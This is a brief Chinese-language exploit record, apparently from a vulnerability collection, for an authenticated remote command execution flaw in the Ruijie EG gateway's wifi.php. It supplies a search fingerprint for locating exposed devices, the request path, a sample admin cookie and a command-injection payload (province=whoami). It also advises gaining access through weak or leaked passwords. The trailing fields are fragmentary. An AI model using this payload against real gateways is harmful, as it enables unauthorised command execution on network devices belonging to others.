# 锐捷EG易网关wifi.php存在后台远程命令执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Ruijie-EG易网关"`
- **请求**：`POST /itbox_pi/wifi.php?a=branch_wifi HTTP/1.1`

**请求体 / payload**
```
1. 通过弱口令或账号密码泄露漏洞登录后台获取cookie
2. 通过上一步获取的cookie执行命令
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=ihvlofd9j5bfjbikfrtng7p9f5; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host:
Content-Length: 16
province=whoami
>
```

**其他**
- 锐捷 EG易网关wifi.php存在后台远程命令执行漏洞: + 四、漏洞复现
---
- 版本: ```java
锐捷EG易网关
```